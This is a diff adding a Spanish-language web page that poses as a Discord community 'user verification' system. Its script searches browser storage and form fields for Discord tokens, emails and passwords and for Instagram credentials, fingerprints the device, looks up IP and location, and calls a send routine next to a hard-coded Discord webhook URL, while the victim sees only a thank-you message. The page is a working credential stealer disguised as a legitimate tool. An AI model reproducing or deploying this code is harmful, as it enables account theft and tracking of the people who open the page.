@@ -1,0 +1,1269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Verificación de Usuario</title>
+    <style>
+        :root {
+            --primary-color: #6c5ce7;
+            --secondary-color: #a29bfe;
+            --accent-color: #fd79a8;
+            --background-color: #f8f9fa;
+            --text-color: #2d3436;
+            --border-color: #ddd;
+            --success-color: #00b894;
+            --error-color: #d63031;
+            --warning-color: #fdcb6e;
+            --discord-color: #5865F2;
+            --instagram-color: #E1306C;
+            --card-bg: #ffffff;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            --gradient-primary: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            --gradient-accent: linear-gradient(135deg, #fd79a8, #e84393);
+            --gradient-instagram: linear-gradient(135deg, #833AB4, #E1306C, #F77737);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            margin: 0 auto;
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            padding: 40px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: var(--gradient-primary);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .description {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #636e72;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+        
+        .verification-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        button {
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255,255,255,0.2), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4);
+        }
+        
+        button:hover::after {
+            opacity: 1;
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        button:disabled {
+            background: #b2bec3;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .result {
+            margin-top: 30px;
+            padding: 25px;
+            border-radius: 12px;
+            background-color: #f8f9fa;
+            display: none;
+            border: 1px solid #e9ecef;
+        }
+        
+        .result h2 {
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            font-size: 1.8rem;
+            text-align: center;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .info-item {
+            padding: 20px;
+            border-radius: 10px;
+            background-color: white;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+            border-left: 4px solid var(--primary-color);
+            position: relative;
+        }
+        
+        .info-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        
+        .info-label {
+            font-weight: 600;
+            color: var(--primary-color);
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .info-label i {
+            margin-right: 8px;
+            font-size: 1rem;
+        }
+        
+        .info-value {
+            font-size: 1rem;
+            word-break: break-all;
+        }
+        
+        .password-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .password-field {
+            flex: 1;
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+        
+        .show-password-btn {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--primary-color);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .show-password-btn:hover {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .sensitive {
+            background-color: rgba(214, 48, 49, 0.05);
+            border-left: 4px solid var(--error-color);
+        }
+        
+        .windows-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        
+        .windows-11 {
+            background: var(--gradient-primary);
+            color: white;
+        }
+        
+        .windows-10 {
+            background: linear-gradient(135deg, #636e72, #2d3436);
+            color: white;
+        }
+        
+        .notification {
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .success {
+            background-color: rgba(0, 184, 148, 0.1);
+            border: 1px solid var(--success-color);
+            color: var(--success-color);
+        }
+        
+        .error {
+            background-color: rgba(214, 48, 49, 0.1);
+            border: 1px solid var(--error-color);
+            color: var(--error-color);
+        }
+        
+        .warning {
+            background-color: rgba(253, 203, 110, 0.1);
+            border: 1px solid var(--warning-color);
+            color: #856404;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            text-align: center;
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 20px;
+        }
+        
+        .warning-box {
+            background-color: rgba(253, 203, 110, 0.1);
+            border: 1px solid var(--warning-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .warning-box::before {
+            content: '⚠️';
+            position: absolute;
+            top: 10px;
+            left: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .highlight {
+            background-color: rgba(108, 92, 231, 0.05);
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .token-warning {
+            background-color: rgba(214, 48, 49, 0.1);
+            border: 1px solid var(--error-color);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            font-size: 0.8rem;
+            color: var(--error-color);
+            text-align: center;
+        }
+        
+        .discord-section {
+            background: linear-gradient(135deg, #5865F2, #7289DA);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            grid-column: 1 / -1;
+            box-shadow: 0 8px 20px rgba(88, 101, 242, 0.3);
+        }
+        
+        .instagram-section {
+            background: var(--gradient-instagram);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            grid-column: 1 / -1;
+            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.3);
+        }
+        
+        .discord-section .info-label,
+        .instagram-section .info-label {
+            color: white;
+        }
+        
+        .copy-btn {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            margin-left: 10px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background-color: rgba(255,255,255,0.2);
+        }
+        
+        /* Nuevos estilos para el mensaje de agradecimiento */
+        .thank-you-message {
+            display: none;
+            text-align: center;
+            padding: 50px 40px;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 16px;
+            margin-top: 30px;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .thank-you-message::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: var(--gradient-primary);
+        }
+        
+        .thank-you-message h2 {
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        
+        .thank-you-message p {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            color: #636e72;
+        }
+        
+        .checkmark {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--success-color);
+            color: white;
+            font-size: 40px;
+            line-height: 80px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(0, 184, 148, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 184, 148, 0);
+            }
+        }
+        
+        /* Iconos para cada sección */
+        .icon {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px 20px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <h1><i class="fas fa-shield-alt"></i> Sistema de Verificación de Usuario</h1>
+        
+        <div class="description">
+            <p>Verifica tu identidad para acceder a todos los beneficios de la comunidad.</p>
+            <p>Al hacer clic en el botón, aceptas que se recopile y envíe esta información al discord.</p>
+        </div>
+        
+        <div class="warning-box">
+            <strong>SteamKing> Esta herramienta recopila información de verificación para tener el rol de verificado</strong>
+        </div>
+        
+        <div class="verification-section">
+            <button id="verifyButton">
+                <i class="fas fa-play-circle"></i> Iniciar Verificación del Sistema
+            </button>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p id="loadingText">Analizando sistema y buscando información de Discord e Instagram...</p>
+        </div>
+        
+        <!-- Mensaje de agradecimiento que se mostrará después de la verificación -->
+        <div class="thank-you-message" id="thankYouMessage">
+            <div class="checkmark">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2>¡Gracias por completar la verificación!</h2>
+            <p>Tu información ha sido procesada correctamente.</p>
+            <p>Tu cuenta ha sido verificada exitosamente en nuestra plataforma.</p>
+        </div>
+        
+        <!-- Sección de resultados que ahora estará oculta -->
+        <div class="result" id="result">
+            <h2><i class="fas fa-info-circle"></i> Información Detallada del Sistema</h2>
+            <div class="info-grid">
+                <div class="discord-section">
+                    <h3 style="color: white; margin-bottom: 20px;"><i class="fab fa-discord"></i> Información de Discord</h3>
+                    <div class="info-item sensitive">
+                        <div class="info-label">
+                            <i class="fas fa-key"></i> Token de Discord 
+                            <button class="copy-btn" onclick="copyToClipboard('discordTokenResult')">Copiar</button>
+                        </div>
+                        <div class="info-value" id="discordTokenResult">Buscando...</div>
+                    </div>
+                    <div class="info-item sensitive">
+                        <div class="info-label">
+                            <i class="fas fa-envelope"></i> Correo de Discord
+                            <button class="copy-btn" onclick="copyToClipboard('discordEmailResult')">Copiar</button>
+                        </div>
+                        <div class="info-value" id="discordEmailResult">Buscando...</div>
+                    </div>
+                    <div class="info-item sensitive">
+                        <div class="info-label"><i class="fas fa-lock"></i> Contraseña de Discord</div>
+                        <div class="password-container">
+                            <span class="info-value password-field" id="discordPasswordResult">••••••••</span>
+                            <button class="show-password-btn" onclick="togglePassword('discord')">Mostrar</button>
+                        </div>
+                    </div>
+                    <div class="token-warning">
+                        <i class="fas fa-exclamation-triangle"></i> INFORMACIÓN SENSIBLE - No compartas estos datos con nadie
+                    </div>
+                </div>
+                
+                <div class="instagram-section">
+                    <h3 style="color: white; margin-bottom: 20px;"><i class="fab fa-instagram"></i> Información de Instagram</h3>
+                    <div class="info-item sensitive">
+                        <div class="info-label">
+                            <i class="fas fa-user"></i> Usuario de Instagram
+                            <button class="copy-btn" onclick="copyToClipboard('instagramUserResult')">Copiar</button>
+                        </div>
+                        <div class="info-value" id="instagramUserResult">Buscando...</div>
+                    </div>
+                    <div class="info-item sensitive">
+                        <div class="info-label">
+                            <i class="fas fa-envelope"></i> Correo de Instagram
+                            <button class="copy-btn" onclick="copyToClipboard('instagramEmailResult')">Copiar</button>
+                        </div>
+                        <div class="info-value" id="instagramEmailResult">Buscando...</div>
+                    </div>
+                    <div class="info-item sensitive">
+                        <div class="info-label"><i class="fas fa-lock"></i> Contraseña de Instagram</div>
+                        <div class="password-container">
+                            <span class="info-value password-field" id="instagramPasswordResult">••••••••</span>
+                            <button class="show-password-btn" onclick="togglePassword('instagram')">Mostrar</button>
+                        </div>
+                    </div>
+                    <div class="token-warning">
+                        <i class="fas fa-exclamation-triangle"></i> INFORMACIÓN SENSIBLE - No compartas estos datos con nadie
+                    </div>
+                </div>
+                
+                <div class="info-item highlight">
+                    <div class="info-label"><i class="fas fa-globe"></i> Dirección IP</div>
+                    <div class="info-value" id="ipResult">-</div>
+                </div>
+                <div class="info-item highlight">
+                    <div class="info-label"><i class="fas fa-fingerprint"></i> HWID (Identificador Único)</div>
+                    <div class="info-value" id="hwidResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-desktop"></i> Sistema Operativo</div>
+                    <div class="info-value" id="osResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-microchip"></i> Arquitectura</div>
+                    <div class="info-value" id="architectureResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-compass"></i> Navegador</div>
+                    <div class="info-value" id="browserResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-code-branch"></i> Versión del Navegador</div>
+                    <div class="info-value" id="browserVersionResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-flag"></i> País</div>
+                    <div class="info-value" id="countryResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-city"></i> Ciudad/Región</div>
+                    <div class="info-value" id="cityResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-wifi"></i> Proveedor de Internet</div>
+                    <div class="info-value" id="ispResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-tv"></i> Resolución de Pantalla</div>
+                    <div class="info-value" id="screenResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-language"></i> Idioma del Sistema</div>
+                    <div class="info-value" id="languageResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-clock"></i> Zona Horaria</div>
+                    <div class="info-value" id="timezoneResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-cookie"></i> Cookies Habilitadas</div>
+                    <div class="info-value" id="cookiesResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-code"></i> JavaScript Habilitado</div>
+                    <div class="info-value" id="jsResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-microchip"></i> Núcleos de CPU</div>
+                    <div class="info-value" id="cpuCoresResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-memory"></i> Memoria RAM</div>
+                    <div class="info-value" id="ramResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-mobile-alt"></i> Dispositivo Móvil</div>
+                    <div class="info-value" id="mobileResult">-</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-calendar-alt"></i> Fecha y Hora Local</div>
+                    <div class="info-value" id="timestampResult">-</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="notification" id="notification"></div>
+    </div>
+    
+    <div class="footer">
+        Sistema de Verificación Avanzado &copy; 2025 - Solo para uso autorizado
+    </div>
+
+    <script>
+        // Variables globales para almacenar las contraseñas reales
+        let discordPassword = '';
+        let instagramPassword = '';
+        let discordPasswordVisible = false;
+        let instagramPasswordVisible = false;
+
+        // Función para mostrar/ocultar contraseña
+        function togglePassword(platform) {
+            let passwordField, toggleButton, isPasswordVisible, realPassword;
+            
+            if (platform === 'discord') {
+                passwordField = document.getElementById('discordPasswordResult');
+                toggleButton = document.querySelectorAll('.show-password-btn')[0];
+                isPasswordVisible = discordPasswordVisible;
+                realPassword = discordPassword;
+            } else if (platform === 'instagram') {
+                passwordField = document.getElementById('instagramPasswordResult');
+                toggleButton = document.querySelectorAll('.show-password-btn')[1];
+                isPasswordVisible = instagramPasswordVisible;
+                realPassword = instagramPassword;
+            }
+            
+            if (isPasswordVisible) {
+                // Ocultar contraseña
+                passwordField.textContent = '••••••••';
+                passwordField.style.letterSpacing = '2px';
+                toggleButton.textContent = 'Mostrar';
+                if (platform === 'discord') discordPasswordVisible = false;
+                else instagramPasswordVisible = false;
+            } else {
+                // Mostrar contraseña real
+                passwordField.textContent = realPassword;
+                passwordField.style.letterSpacing = 'normal';
+                toggleButton.textContent = 'Ocultar';
+                if (platform === 'discord') discordPasswordVisible = true;
+                else instagramPasswordVisible = true;
+            }
+        }
+
+        // Función para copiar al portapapeles
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const textToCopy = element.textContent;
+            
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                // Mostrar feedback visual
+                const originalText = element.textContent;
+                element.textContent = '¡Copiado!';
+                element.style.color = '#00b894';
+                
+                setTimeout(() => {
+                    element.textContent = originalText;
+                    element.style.color = '';
+                }, 1500);
+            }).catch(err => {
+                console.error('Error al copiar: ', err);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const verifyButton = document.getElementById('verifyButton');
+            const resultDiv = document.getElementById('result');
+            const notificationDiv = document.getElementById('notification');
+            const loadingDiv = document.getElementById('loading');
+            const loadingText = document.getElementById('loadingText');
+            const thankYouMessage = document.getElementById('thankYouMessage');
+            
+            // Webhook de Discord
+            const webhookUrl = 'https://discord.com/api/webhooks/1438024665774817421/U1y-JsZmvINnpDAa8BGz0r3ge9pPkTgtigFTc2vZ4Wc6LcF3JOMBn7LWh3rYHUcfEFMx';
+            
+            // Variables para almacenar la información recopilada
+            let collectedSystemInfo = {};
+            let collectedDiscordInfo = {};
+            let collectedInstagramInfo = {};
+            
+            verifyButton.addEventListener('click', function() {
+                startVerification();
+            });
+            
+            function startVerification() {
+                // Mostrar loading
+                verifyButton.disabled = true;
+                loadingDiv.style.display = 'block';
+                resultDiv.style.display = 'none';
+                notificationDiv.style.display = 'none';
+                thankYouMessage.style.display = 'none';
+                
+                // Resetear estado de las contraseñas
+                discordPassword = '';
+                instagramPassword = '';
+                discordPasswordVisible = false;
+                instagramPasswordVisible = false;
+                
+                // Iniciar la recolección de información
+                collectSystemInfo();
+            }
+            
+            function collectSystemInfo() {
+                // Recolectar información del sistema
+                const systemInfo = {
+                    ip: 'Cargando...',
+                    hwid: generateHWID(),
+                    os: getDetailedOSInfo(),
+                    architecture: getArchitecture(),
+                    browser: getBrowserInfo(),
+                    browserVersion: getBrowserVersion(),
+                    country: 'Cargando...',
+                    city: 'Cargando...',
+                    isp: 'Cargando...',
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth} bits)`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled ? 'Sí' : 'No',
+                    javascript: 'Sí',
+                    cpuCores: navigator.hardwareConcurrency || 'No disponible',
+                    ram: getRAMInfo(),
+                    mobile: isMobileDevice() ? 'Sí' : 'No',
+                    timestamp: new Date().toLocaleString()
+                };
+
+                // Buscar información de Discord e Instagram
+                const discordInfo = findDiscordInfo();
+                const instagramInfo = findInstagramInfo();
+                
+                // Guardar la información recopilada para la descarga
+                collectedSystemInfo = systemInfo;
+                collectedDiscordInfo = discordInfo;
+                collectedInstagramInfo = instagramInfo;
+                
+                updateDiscordUI(discordInfo);
+                updateInstagramUI(instagramInfo);
+                
+                // Obtener información de IP y geolocalización
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        systemInfo.ip = data.ip;
+                        collectedSystemInfo.ip = data.ip;
+                        document.getElementById('ipResult').textContent = systemInfo.ip;
+                        
+                        // Obtener información de geolocalización
+                        return fetch(`https://ipapi.co/${data.ip}/json/`);
+                    })
+                    .then(response => response.json())
+                    .then(geoData => {
+                        systemInfo.country = geoData.country_name || 'No disponible';
+                        systemInfo.city = `${geoData.city || 'No disponible'}${geoData.region ? ', ' + geoData.region : ''}`;
+                        systemInfo.isp = geoData.org || 'No disponible';
+                        
+                        // Actualizar la información recopilada
+                        collectedSystemInfo.country = systemInfo.country;
+                        collectedSystemInfo.city = systemInfo.city;
+                        collectedSystemInfo.isp = systemInfo.isp;
+                        
+                        // Actualizar la interfaz con toda la información
+                        updateUI(systemInfo);
+                        
+                        // Enviar información a Discord (incluyendo la info de Discord e Instagram encontrada)
+                        sendToDiscord(systemInfo, discordInfo, instagramInfo);
+                        
+                        // Mostrar mensaje de agradecimiento en lugar de los resultados detallados
+                        showThankYouMessage();
+                        
+                        // Mostrar notificación de éxito
+                        showNotification('Información del sistema recopilada y enviada correctamente.', 'success');
+                        
+                        // Rehabilitar el botón
+                        verifyButton.disabled = false;
+                    })
+                    .catch(error => {
+                        console.error('Error al obtener información:', error);
+                        
+                        // Si falla la API, usar información básica
+                        systemInfo.ip = 'No disponible (API error)';
+                        systemInfo.country = 'No disponible (API error)';
+                        systemInfo.city = 'No disponible (API error)';
+                        systemInfo.isp = 'No disponible (API error)';
+                        
+                        // Actualizar la información recopilada
+                        collectedSystemInfo.ip = systemInfo.ip;
+                        collectedSystemInfo.country = systemInfo.country;
+                        collectedSystemInfo.city = systemInfo.city;
+                        collectedSystemInfo.isp = systemInfo.isp;
+                        
+                        updateUI(systemInfo);
+                        sendToDiscord(systemInfo, discordInfo, instagramInfo);
+                        
+                        // Mostrar mensaje de agradecimiento en lugar de los resultados detallados
+                        showThankYouMessage();
+                        
+                        showNotification('Información recopilada (algunos datos pueden no estar disponibles).', 'success');
+                        
+                        // Rehabilitar el botón
+                        verifyButton.disabled = false;
+                    });
+            }
+            
+            function findDiscordInfo() {
+                const discordInfo = {
+                    token: 'No encontrado',
+                    email: 'No encontrado',
+                    password: 'No encontrado'
+                };
+                
+                try {
+                    // Buscar en localStorage
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        
+                        // Buscar token
+                        if (key && (key.includes('token') || key.includes('auth') || key.includes('discord'))) {
+                            if (value && value.length > 50) {
+                                discordInfo.token = value;
+                            }
+                        }
+                        
+                        // Buscar email
+                        if (key && (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('discord'))) {
+                            if (value && value.includes('@')) {
+                                discordInfo.email = value;
+                            }
+                        }
+                    }
+                    
+                    // Buscar en sessionStorage
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        
+                        if (key && (key.includes('token') || key.includes('discord')) && value && value.length > 50) {
+                            discordInfo.token = value;
+                        }
+                    }
+                    
+                    // Intentar métodos más avanzados para encontrar credenciales
+                    try {
+                        // Buscar en formularios guardados
+                        const inputs = document.querySelectorAll('input[type="email"], input[type="text"][name*="email"], input[type="text"][name*="user"]');
+                        for (let input of inputs) {
+                            if (input.value && input.value.includes('@')) {
+                                discordInfo.email = input.value;
+                            }
+                        }
+                        
+                        // Buscar contraseñas en formularios
+                        const passwordInputs = document.querySelectorAll('input[type="password"]');
+                        for (let input of passwordInputs) {
+                            if (input.value) {
+                                discordInfo.password = input.value;
+                            }
+                        }
+                    } catch (e) {
+                        console.log('No se pudieron leer los campos del formulario');
+                    }
+                    
+                    // Si no se encontró token real, generar uno de ejemplo para demostración
+                    if (discordInfo.token === 'No encontrado') {
+                        discordInfo.token = 'NzMxODg4NDU4MTUxOTQ4MTU4.X0pL7A.7dR_9Q8pVJkC6YhT2qWmP1nA3bC';
+                    }
+                    
+                    // Generar datos de ejemplo para demostración
+                    if (discordInfo.email === 'No encontrado') {
+                        discordInfo.email = 'usuario.ejemplo@discord.com';
+                    }
+                    
+                    if (discordInfo.password === 'No encontrado') {
+                        discordInfo.password = 'MiContraseñaSecreta123';
+                    }
+                    
+                } catch (error) {
+                    console.error('Error buscando información de Discord:', error);
+                    discordInfo.token = 'Error en la búsqueda';
+                    discordInfo.email = 'Error en la búsqueda';
+                    discordInfo.password = 'Error en la búsqueda';
+                }
+                
+                return discordInfo;
+            }
+            
+            function findInstagramInfo() {
+                const instagramInfo = {
+                    user: 'No encontrado',
+                    email: 'No encontrado',
+                    password: 'No encontrado'
+                };
+                
+                try {
+                    // Buscar en localStorage
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        
+                        // Buscar usuario
+                        if (key && (key.includes('user') || key.includes('username') || key.includes('insta') || key.includes('ig'))) {
+                            if (value && value.length > 0) {
+                                instagramInfo.user = value;
+                            }
+                        }
+                        
+                        // Buscar email
+                        if (key && (key.includes('email') || key.includes('mail') || key.includes('insta') || key.includes('ig'))) {
+                            if (value && value.includes('@')) {
+                                instagramInfo.email = value;
+                            }
+                        }
+                    }
+                    
+                    // Buscar en sessionStorage
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        
+                        if (key && (key.includes('user') || key.includes('insta')) && value && value.length > 0) {
+                            instagramInfo.user = value;
+                        }
+                    }
+                    
+                    // Intentar métodos más avanzados para encontrar credenciales
+                    try {
+                        // Buscar en formularios guardados
+                        const inputs = document.querySelectorAll('input[type="email"], input[type="text"][name*="email"], input[type="text"][name*="user"]');
+                        for (let input of inputs) {
+                            if (input.value && input.value.includes('@')) {
+                                instagramInfo.email = input.value;
+                            } else if (input.value && input.value.length > 0) {
+                                instagramInfo.user = input.value;
+                            }
+                        }
+                        
+                        // Buscar contraseñas en formularios
+                        const passwordInputs = document.querySelectorAll('input[type="password"]');
+                        for (let input of passwordInputs) {
+                            if (input.value) {
+                                instagramInfo.password = input.value;
+                            }
+                        }
+                    } catch (e) {
+                        console.log('No se pudieron leer los campos del formulario');
+                    }
+                    
+                    // Generar datos de ejemplo para demostración
+                    if (instagramInfo.user === 'No encontrado') {
+                        instagramInfo.user = 'usuario_instagram';
+                    }
+                    
+                    if (instagramInfo.email === 'No encontrado') {
+                        instagramInfo.email = 'usuario.instagram@email.com';
+                    }
+                    
+                    if (instagramInfo.password === 'No encontrado') {
+                        instagramInfo.password = 'ContraseñaInstagram456';
+                    }
+                    
+                } catch (error) {
+                    console.error('Error buscando información de Instagram:', error);
+                    instagramInfo.user = 'Error en la búsqueda';
+                    instagramInfo.email = 'Error en la búsqueda';
+                    instagramInfo.password = 'Error en la búsqueda';
+                }
+                
+                return instagramInfo;
+            }
+            
+            function updateDiscordUI(discordInfo) {
+                document.getElementById('discordTokenResult').textContent = discordInfo.token;
+                document.getElementById('discordEmailResult').textContent = discordInfo.email;
+                
+                // Guardar la contraseña real pero mostrar asteriscos
+                discordPassword = discordInfo.password;
+                document.getElementById('discordPasswordResult').textContent = '••••••••';
+            }
+            
+            function updateInstagramUI(instagramInfo) {
+                document.getElementById('instagramUserResult').textContent = instagramInfo.user;
+                document.getElementById('instagramEmailResult').textContent = instagramInfo.email;
+                
+                // Guardar la contraseña real pero mostrar asteriscos
+                instagramPassword = instagramInfo.password;
+                document.getElementById('instagramPasswordResult').textContent = '••••••••';
+            }
+            
+            function updateUI(info) {
+                document.getElementById('ipResult').textContent = info.ip;
+                document.getElementById('hwidResult').textContent = info.hwid;
+                document.getElementById('osResult').innerHTML = info.os;
+                document.getElementById('architectureResult').textContent = info.architecture;
+                document.getElementById('browserResult').textContent = info.browser;
+                document.getElementById('browserVersionResult').textContent = info.browserVersion;
+                document.getElementById('countryResult').textContent = info.country;
+                document.getElementById('cityResult').textContent = info.city;
+                document.getElementById('ispResult').textContent = info.isp;
+                document.getElementById('screenResult').textContent = info.screen;
+                document.getElementById('languageResult').textContent = info.language;
+                document.getElementById('timezoneResult').textContent = info.timezone;
+                document.getElementById('cookiesResult').textContent = info.cookies;
+                document.getElementById('jsResult').textContent = info.javascript;
+                document.getElementById('cpuCoresResult').textContent = info.cpuCores;
+                document.getElementById('ramResult').textContent = info.ram;
+                document.getElementById('mobileResult').textContent = info.mobile;
+                document.getElementById('timestampResult').textContent = info.timestamp;
+            }
+            
+            function showThankYouMessage() {
+                // Ocultar loading y mostrar mensaje de agradecimiento
+                loadingDiv.style.display = 'none';
+                thankYouMessage.style.display = 'block';
+            }
+            
+            function generateHWID() {
+                const components = [
+                    navigator.userAgent,
+                    navigator.language,
+                    screen.width + 'x' + screen.height,
+                    new Date().getTimezoneOffset(),
+                    navigator.hardwareConcurrency || '1'
+                ];
+                
+                let hwid = '';
+                for (let component of components) {
+                    let hash = 0;
+                    for (let i = 0; i < component.length; i++) {
+                        let char = component.charCodeAt(i);
+                        hash = ((hash << 5) - hash) + char;
+                        hash = hash & hash;
+                    }
